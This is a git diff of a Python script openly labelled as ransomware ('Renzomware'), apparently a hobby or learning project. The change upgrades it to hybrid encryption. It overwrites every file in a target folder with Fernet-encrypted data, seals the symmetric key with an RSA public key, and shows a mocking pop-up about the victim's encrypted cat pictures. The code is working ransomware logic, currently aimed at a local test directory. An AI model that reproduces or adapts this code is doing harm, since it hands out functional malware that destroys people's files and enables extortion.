@@ -1,12 +1,15 @@
+from cryptography.fernet import Fernet
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.primitives.asymmetric import padding
 
-from common import list_files, show_pop_up, PUBLIC_KEY_FILE_NAME
+from common import list_files, show_pop_up, PUBLIC_ASYM_KEY_FILE_NAME, SYM_KEY_FILE_NAME
 
 import os
 
+
 TEST_DIR_TO_ENCRYPT = f"{os.path.dirname(os.path.abspath(__file__))}/agentes_secretos"
+
 
 def read_public_key(filename):
     with open(filename, "rb") as key_file:
@@ -18,12 +21,24 @@ def read_public_key(filename):
     return public_key
 
 
-def encrypt_file(filename, public_key):
+def encrypt_file(filename, key):
     with open(filename, "rb") as file_to_encrypt:
         file_data = file_to_encrypt.read()
 
-    encrypted_data = public_key.encrypt(
-        file_data,
+    encrypted_data = Fernet(key).encrypt(file_data)
+
+    with open(filename, "wb") as encrypted_file:
+        encrypted_file.write(encrypted_data)
+
+
+def encrypt_files(files, public_key, sym_key_file_name):
+    sym_key = Fernet.generate_key()
+
+    for filename in files:
+        encrypt_file(filename,  sym_key)
+
+    encrypted_key = public_key.encrypt(
+        sym_key,
         padding.OAEP(
             mgf=padding.MGF1(algorithm=hashes.SHA256()),
             algorithm=hashes.SHA256(),
@@ -31,15 +46,16 @@ def encrypt_file(filename, public_key):
         )
     )
 
-    with open(filename, "wb") as encrypted_file:
-        encrypted_file.write(encrypted_data)
+    with open(sym_key_file_name, "wb") as encrypted_key_file:
+        encrypted_key_file.write(encrypted_key)
 
 
 def main():
-    public_key = read_public_key(PUBLIC_KEY_FILE_NAME)
+    public_key = read_public_key(PUBLIC_ASYM_KEY_FILE_NAME)
 
-    for filename in list_files(TEST_DIR_TO_ENCRYPT):
-        encrypt_file(filename, public_key)
+    files = list_files(TEST_DIR_TO_ENCRYPT)
+
+    encrypt_files(files, public_key, SYM_KEY_FILE_NAME)
 
     show_pop_up("Toma um Renzomware!!", "Seus arquivos de gatinhos agora estão encriptados, muahaha!!")
 
